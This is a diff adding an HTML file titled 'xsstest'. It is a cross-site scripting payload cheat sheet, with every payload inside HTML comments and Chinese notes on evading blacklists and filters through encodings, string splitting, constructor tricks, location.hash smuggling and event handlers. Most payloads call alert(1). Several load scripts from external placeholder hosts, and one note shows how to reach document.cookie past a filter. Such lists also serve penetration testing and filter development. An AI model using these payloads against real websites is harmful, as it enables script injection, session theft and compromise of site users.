@@ -1,0 +1,309 @@
+<html>
+<title>xsstest</title>
+<!-- <svg onload=x/alert("1")> -->
+<!-- <video src=1 onerror=alert(1)> -->
+<!-- <audio src=x onerror=alert(1)> -->
+<!-- <button onfocus=alert(1) autofocus> -->
+<!-- <svg onload="javascript:alert(1)"> -->
+<!-- <svg onload="javascript:alert(1)" xmlns="https://www.baidu.com"> -->
+<!-- <details open ontoggle=top.alert(1)> -->
+<!-- <details open ontoggle=top['alert'](1)> -->
+<!-- <details open ontoggle=top['prompt'](1)> -->
+<!-- <details open ontoggle=top['conf'%2b'irm'](1)>  针对黑名单url编码绕过 -->
+<!-- <details open ontoggle=top.eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')> -->
+<!-- <details open ontoggle=\u0065val(atob('YWxlcnQoMSk='))> -->
+<!-- <details open ontoggle=top.eval("appendChild(createElement('script')).src='https://www.baidu.com'") src为xss代码地址> -->
+<!-- <img src=1 onerror=window.alert(1)> -->
+<!-- <img src=x onerror=_=alert,_(1)> -->
+<!-- <img src=x onerror=_=alert;x=1;_(1)>  上面payload的变形可以执行-->
+<!-- <iframe onload=location=['javasc','ript:al','ert(1)'].join('')> -->
+<!-- <iframe onload=location='javascri'.concat('pt:aler','t(1)')> -->
+
+
+
+<!-- 拼接函数：top、this、self、parent、frames、content、window -->
+<!-- <body/onfocus=top.alert(1)> -->
+<!-- <body onpageshow=top['confir'%2b'm'](1)> -->
+<!-- <audio src/onerror=self['pro'+'mpt'](1)> -->
+<!-- <details ontoggle=this['ale'+'rt']`1` open> -->
+<!-- <marquee onstart=top.eval('ale'%2B'rt(1)')> -->
+<!-- <img/src=1 onerror=window.alert(1)> -->
+<!-- <svg onload="a(this);function a(){}(alert`1`)"> -->
+
+
+
+
+<!-- 常见的编码类型：URL编码、base64编码、Hex编码、JS8编码、JS16编码、Unicode编码、html编码 -->
+<!-- 既然是编码肯定需要一些函数来执行，比如：eval，setTimeout，setInterval，constructor，execScript(IE)等 -->
+<!-- # URL -->
+<!-- <img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%31%29'))"> -->
+<!-- <details open ontoggle=eval('%61%6c%65%72%74%28%31%29') > -->
+<!-- <details open ontoggle=%65%76%61%6c(atob('YWxlcnQoMSk=')) > -->
+<!-- # base64 -->
+<!-- <details open ontoggle=eval(atob('YWxlcnQoMSk='))> -->
+<!-- # JS8 -->
+<!-- <body onpageshow=content['\141\154\145\162\164'](1)> -->
+<!-- <svg/onload=setTimeout('\141\154\145\162\164\50\61\51')> -->
+<!-- # JS16 -->
+<!-- <body onpageshow=frames['\x61\x6c\x65\x72\x74'](1)> -->
+<!-- <svg/onload=Set.constructor`al\x65rt\x281\x29```> -->
+<!-- <svg/onload=Map.constructor`al\x65rt\x281\x29```> -->
+<!-- <svg/onload=clear.constructor`al\x65rt\x281\x29```> -->
+<!-- <svg/onload=Array.constructor`al\x65rt\x281\x29```> -->
+<!-- <svg/onload=WeakSet.constructor`al\x65rt\x281\x29```> -->
+<!-- # unicode -->
+<!-- <a href="javascript:al\u0065rt()">XSS Test</a> -->
+<!-- <a href="javascript:al\u{65}rt()">XSS Test</a> -->
+<!-- <svg/onload=\u0073etInterval('\141\154\145\162\164\50\61\51')> -->
+<!-- <svg/onload=setTimeout`prompt\u00281\u0029`> -->
+<!-- # Ascii -->
+<!-- <img/src=1 onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))"> -->
+
+
+<!-- 利用正则表达式返回字符串 -->
+<!-- eval('~a~le~rt~~(~~1~~)~'.replace(/~/g, '')) -->
+<!-- eval(/~a~le~rt~~(~~1~~)~/.source.replace(/~/g, new String())) -->
+<!-- <a href="javascript:window[/alert/.source]()">XSS Test</a> -->
+<!-- <a href="javascript:''.replace(/.*/,alert)">XSS Test</a> -->
+<!-- <img src=1 onerror=eval('~a~le~rt~~(~~1~~)~'.replace(/~/g, ''))> -->
+<!-- 利用toString转换字符串。整数toString(radix)转字符串, 第一个点表示浮点数，第二个点表示调用函数 -->
+<!-- <a href="javascript:top[8680439..toString(30)]()">XSS Test</a> -->
+<!-- <details open ontoggle=top[8680439..toString(30)](1); > -->
+<!-- <details open ontoggle=top[11189117..toString(32)](1); > -->
+<!-- alert字符串用parseInt函数，以基数为30转化后为8680439 -->
+<!-- parseInt('alert',30) == 8680439 -->
+<!-- toString函数将返回的数字8680439，以基数为30还原 -->
+<!-- 8680439..toString(30) == alert -->
+
+
+<!-- 函数多样调用 -->
+<!-- <a href="javascript:alert.call(null,'param')">XSS Test</a> -->
+<!-- <a href="javascript:alert.apply(null,['param'])">XSS Test</a> -->
+<!-- <a href="javascript:alert.bind()('param')">XSS Test</a> -->
+<!-- <a href="javascript:Reflect.apply(alert,null,['param'])">XSS Test</a> -->
+<!-- <a href="javascript:setTimeout`alert\x28\x29`">XSS Test</a> -->
+<!-- <a href="javascript:eval(atob())">XSS Test</a> -->
+<!-- <a href="javascript:eval(String.fromCharCode(97,108,))">XSS Test</a> -->
+<!-- <img src=1 onerror=(function(){alert(1)})()> -->
+<!-- <img src=1 onerror=!function(){alert(1)}()> -->
+<!-- <img src=1 onerror=%2bfunction(){alert(1)}()> -->
+<!-- <img src=1 onerror=%2dfunction(){alert(1)}()> -->
+<!-- <img src=1 onerror=~function(){alert(1)}()> -->
+<!-- <a href="javascript:(alert)()">XSS Test</a> -->
+<!-- 模板字符串：反引号`` -->
+<!-- <a href="javascript:`${alert(1)}`">XSS Test</a> -->
+
+
+<!-- 利用数组等的功能函数 -->
+<!-- <a href="javascript:[''].find(alert`1`)">XSS Test</a> -->
+<!-- <a href="javascript:[''].findIndex(alert(1)">XSS Test</a> -->
+<!-- <a href="javascript:[''].filter(alert)">XSS Test</a> -->
+<!-- <a href="javascript:[''].forEach(alert)">XSS Test</a> -->
+<!-- <a href="javascript:(new Map()).set(1,'').forEach(alert)">XSS Test</a> -->
+<!-- <a href="javascript:(new Set([''])).forEach(alert)">XSS Test</a> -->
+<!-- 利用拼接数组函数 -->
+<!-- concat()不仅仅可以用于连接两个或多个数组，还可以合并两个或者多个字符串 -->
+<!-- <svg/onload=location='javas'.concat('cript:ale','rt(1)')> -->
+<!-- <iframe onload=s=createElement('script');body.appendChild(s);s.src='http://v'.\u0063oncat('ps/','js'); > -->
+<!-- 防护过滤了document.cookie 
+document['coo'['CONCAT'.toLowerCase()]('kie')]  -->
+<!-- join()将数组转换成字符串 -->
+<!-- <iframe onload=location=['javascript:alert(1)'].join(")> -->
+<!-- 新建函数 -->
+<!-- <a href="javascript:(new Function('alert()'))()">XSS Test</a> -->
+<!-- <body/onload=Function(alert(1))()> -->
+<!-- <img%0Dsrc=1 onerror=Function(alert(1))> -->
+<!-- <a href="javascript:Set.constructor`alert\x28\x29```">XSS Test</a> -->
+<!-- <a href="javascript:(new (Object.getPrototypeOf(async function(){}).constructor)('alert()'))()">XSS Test</a> -->
+<!-- location -->
+<!-- location对象的hash属性用于设置或取得 URL 中的锚部分，比如：http://localhost/1.php#alert(1)，我们在控制台输入location.hash，则会返回我们设定的锚，即#alert(1)。 -->
+<!-- 再结合slice()、substr()等字符串处理函数获取字符串 -->
+<!-- <body/onload=eval(location.hash.slice(1))>#alert(1) -->
+<!-- <body/onload=setTimeout(location.hash.substr(1))()>#alert(1) -->
+<!-- <body/onload=Set.constructor(location.hash.substr(1))()>#alert(1) -->
+<!-- <body/onload=execScript(location.hash.substr(1))>#alert(1) -->
+<!-- 使用Function匿名函数来执行尾部的代码 -->
+<!-- <body/onload=Function(location.hash.slice(1))()>#alert(1) -->
+<!-- location.search也类似 -->
+<!-- # dom.html -->
+<!-- <html> -->
+  <!-- <body> -->
+    <!-- <script> -->
+      <!-- document.write(decodeURI(window.location.search)); -->
+    <!-- </script> -->
+  <!-- </body> -->
+<!-- </html> -->
+<!-- # payload -->
+<!-- dom.html?<svg/onload=alert(1) -->
+
+<!-- 1.php?(1)&code=<img/src=1 onerror=a=location.search;location="javascript:alert"+a[1]+a[2]+a[3]> -->
+<!-- <svg onload=eval(URL.slice(-8))>#alert(1)   有点问题 -->
+
+
+
+<!-- 伪协议 -->
+<!-- <body/onload=eval(location.hash.slice(1))>#javascript:alert(1) -->
+<!-- <body/onload=eval(location.hash.slice(1))>#vbscript:msgbox(1) -->
+<!-- <a href="javascript:confirm(1)">XSS Test</a> -->
+<!-- <iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(1)"> -->
+<!-- <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4="> -->
+<!-- <iframe/src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4="> -->
+<!-- <video><source onerror="javascript:confirm(1);"> -->
+<!-- <img src=1 onerror=location="javascript:alert(1)"> -->
+<!-- # 使用xmlns属性 -->
+<!-- <svg/onload="javascript:alert(1)" xmlns="http://www.baidu.com"> -->
+<!-- # 使用注释 -->
+<!-- <svg/onload=location='javascript:/*'%2blocation.hash> #*/alert(1) -->
+<!-- # innerHTML -->
+<!-- <svg/onload=location="javascript:"%2binnerHTML%2blocation.hash>"  #"-alert(1) -->
+
+<!-- unescape -->
+<!-- <svg/onload=appendChild(createElement('script')).src=unescape('http%3A%2F%2Fxss.tt%2F1te')> -->
+
+
+<!-- with用来引用某个特定对象中已有的属性，使用with可以实现通过节点名称的对象调用。 -->
+<!-- 如果.被拦截，可以使用with替代。 -->
+<!-- <svg/onload=with(location)with(hash)eval(alert(1))> -->
+<!-- 基于DOM的方法创建和插入节点把外部JS文件注入到网页中，也可以应用with -->
+<!-- <svg/onload="[1].find(function(){with(`docom'|e|'nt`);;body.appendChild(createElement('script')).src='http://vps/js'})"> -->
+
+<!-- 过滤括号 -->
+<!-- <svg/onload="window.onerror=eval;throw'=alert\x281\x29';"> -->
+<!-- <img/src=1 onerror="top.onerror=alert; throw 1"> -->
+<!-- <img src=x onerror=alert`1`> -->
+<!-- <img src=1 onerror=alert%28%29> -->
+<!-- <img src=1 onerror=location="javascript:"+"aler"+"t%281%29"> -->
+
+<!-- 引用外部url -->
+<!-- <details open ontoggle=eval("appendChild(createElement('script')).src='http://vps/js'")> -->
+<!-- <iframe onload=s=createElement('script');body.appendChild(s);s.src='http://v'.concat('ps/','js');> -->
+<!-- <body/onload=document.write(String.fromCharCode(60,115,67,114,73,112,116,32,115,114,67,61,104,116,116,112,58,47,47,118,112,115,47,106,115,62,60,47,115,67,82,105,112,84,62))> -->
+<!-- 利用link -->
+<!-- <link rel=import href="http://vps/1.js"> -->
+
+<!-- 赋值 -->
+<!-- # 变量 -->
+<!-- <img/src=1 onerror=_=alert,_(1)> -->
+<!-- <style onload=_=alert;_(1)> -->
+<!-- <details/open/ontoggle=_=alert;x=1;_`1`> -->
+<!-- <details open ontoggle=top[a='al',b='ev',b%2ba](prompt(1))> -->
+<!-- <details open ontoggle=top[a='al',b='ev',b%2ba]('\141\154\145\162\164\50\61\51')> -->
+<!-- <details open ontoggle=top[a='meout',b='setTi',b%2ba]('\141\154\145\162\164\50\61\51')> -->
+<!-- # 函数 -->
+<!-- <img/src=1 onmouseover="a=alert,a`1`"> -->
+<!-- # 属性 -->
+<!-- <img src=1 alt=al lang=ert onerror=top[alt%2blang](1)> -->
+
+<!-- 黑名单 -->
+<!-- (alert)(1) -->
+<!-- a=alert,a(1) -->
+<!-- [1].find(alert) -->
+<!-- top["al"+"ert"](1) -->
+<!-- self[/al/.source+/ert/.source](1) -->
+<!-- al\u0065rt(1) -->
+<!-- frames['al\145rt'](1) -->
+<!-- content[8680439..toString(30)](1) -->
+
+
+<!-- <body onload=alert(1)> -->
+<!-- <body onpageshow=alert(1)> -->
+<!-- <body onfocus=alert(1)> -->
+<!-- <body onhashchange=alert(1)><a href=#></a> -->
+<!-- <body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x -->
+<!-- <body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><x id=x>#x -->
+
+<!-- <marquee onstart=alert(1)> -->
+<!-- <marquee loop=1 width=0 onfinish=alert(1)> -->
+<!-- <audio src onloadstart=alert(1)> -->
+<!-- <video onloadstart=alert(1)><source> -->
+<!-- <input autofocus onblur=alert(1)> -->
+<!-- <keygen autofocus onfocus=alert(1)> -->
+<!-- <form onsubmit=alert(1)><input type=submit> -->
+<!-- <select onchange=alert(1)><option>1<option>2 -->
+
+
+<!-- <x contenteditable onblur=alert(1)>lose focus! -->
+<!-- <x onclick=alert(1)>click this! -->
+<!-- <x oncopy=alert(1)>copy this! -->
+<!-- <x oncontextmenu=alert(1)>right click this! -->
+<!-- <x oncut=alert(1)>copy this! -->
+<!-- <x ondblclick=alert(1)>double click this! -->
+<!-- <x ondrag=alert(1)>drag this! -->
+<!-- <x contenteditable onfocus=alert(1)>focus this! -->
+<!-- <x contenteditable oninput=alert(1)>input here! -->
+<!-- <x contenteditable onkeydown=alert(1)>press any key! -->
+<!-- <x contenteditable onkeypress=alert(1)>press any key! -->
+<!-- <x contenteditable onkeyup=alert(1)>press any key! -->
+<!-- <x onmousedown=alert(1)>click this! -->
+<!-- <x onmousemove=alert(1)>hover this! -->
+<!-- <x onmouseout=alert(1)>hover this! -->
+<!-- <x onmouseover=alert(1)>hover this! -->
+<!-- <x onmouseup=alert(1)>click this! -->
+<!-- <x contenteditable onpaste=alert(1)>paste here! -->
+<!-- <brute contenteditable onblur=alert(1)>lose focus! -->
+<!-- <brute onclick=alert(1)>click this! -->
+<!-- <brute oncopy=alert(1)>copy this! -->
+<!-- <brute oncontextmenu=alert(1)>right click this! -->
+<!-- <brute oncut=alert(1)>copy this! -->
+<!-- <brute ondblclick=alert(1)>double click this! -->
+<!-- <brute ondrag=alert(1)>drag this! -->
+<!-- <brute contenteditable onfocus=alert(1)>focus this! -->
+<!-- <brute contenteditable oninput=alert(1)>input here! -->
+<!-- <brute contenteditable onkeydown=alert(1)>press any key! -->
+<!-- <brute contenteditable onkeypress=alert(1)>press any key! -->
+<!-- <brute contenteditable onkeyup=alert(1)>press any key! -->
+<!-- <brute onmousedown=alert(1)>click this! -->
+<!-- <brute onmousemove=alert(1)>hover this! -->
+<!-- <brute onmouseout=alert(1)>hover this! -->
+<!-- <brute onmouseover=alert(1)>hover this! -->
+<!-- <brute onmouseup=alert(1)>click this! -->
+<!-- <brute contenteditable onpaste=alert(1)>paste here! -->
+<!-- <brute style=font-size:500px onmouseover=alert(1)>0000 -->
+<!-- <brute style=font-size:500px onmouseover=alert(1)>0001 -->
+<!-- <brute style=font-size:500px onmouseover=alert(1)>0002 -->
+<!-- <brute style=font-size:500px onmouseover=alert(1)>0003 -->
+
+
+<!-- # src -->
+<!-- <script src=javascript:alert(1)> -->
+<!-- <iframe src=javascript:alert(1)> -->
+<!-- <embed src=javascript:alert(1)> -->
+<!-- # href -->
+<!-- <a href=javascript:alert(1)>click -->
+<!-- <math><brute href=javascript:alert(1)>click -->
+<!-- # action -->
+<!-- <form action=javascript:alert(1)><input type=submit> -->
+<!-- <isindex action=javascript:alert(1) type=submit value=click> -->
+<!-- # formaction -->
+<!-- <form><button formaction=javascript:alert(1)>click -->
+<!-- <form><input formaction=javascript:alert(1) type=submit value=click> -->
+<!-- <form><input formaction=javascript:alert(1) type=image value=click> -->
+<!-- <form><input formaction=javascript:alert(1) type=image src=http://brutelogic.com.br/webgun/img/youtube1.jpg> -->
+<!-- <isindex formaction=javascript:alert(1) type=submit value=click> -->
+<!-- # data -->
+<!-- <object data=javascript:alert(1)> -->
+<!-- # srcdoc -->
+<!-- <iframe srcdoc=%26lt;svg/o%26%23x6Eload%26equals;alert%26lpar;1)%26gt;> -->
+<!-- # xlink:href -->
+<!-- <svg><script xlink:href=data:,alert(1)></script> -->
+<!-- <svg><script xlink:href=data:,alert(1) /> -->
+<!-- <math><brute xlink:href=javascript:alert(1)>click -->
+<!-- # from -->
+<!-- <svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=%26> -->
+
+
+
+<!-- <img longdesc="src='x'onerror=alert(document.domain);//><img" src='showme'> -->
+<!-- <img  longdesc="src=" images="" stop.png"="" onerror="alert(document.domain);//&"" src="x" alt="showme"> -->
+<!-- <svg/onload=top[/al/.source+/ert/.source]&lpar;)> -->
+<!-- <svg /\/\//ONLoad='a\u006c\u0065\u0072\u0074(1)'/\/\/\>svg> -->
+<!-- <html \" onmouseover=/*&lt;svg/*/onload=alert(2)//> -->
+<!-- <ijavascriptmg+src+ojavascriptnerror=confirm(1)> 				bapassxss-->
+<!-- <script>window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script> -->
+<!-- <script>eval('\\u'+'0061'+'lert`!`')</script> -->
+<!-- <script>throw~delete~typeof~prompt`!`</script> -->
+<!-- <script>(()=>{return this})().alert`!`</script> -->
+
+
+
+</html>
